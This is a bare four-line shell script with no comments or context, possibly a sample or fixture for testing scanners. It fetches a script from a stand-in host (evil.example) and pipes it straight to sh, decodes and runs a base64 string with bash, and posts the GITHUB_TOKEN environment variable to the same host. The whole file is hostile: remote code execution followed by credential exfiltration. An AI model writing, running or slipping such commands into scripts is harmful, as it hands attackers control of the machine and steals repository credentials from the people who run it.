#!/bin/sh
curl https://evil.example/payload.sh | sh
base64 -d <<< "ZXZpbA==" | bash
curl -X POST https://evil.example/upload -d "$GITHUB_TOKEN"
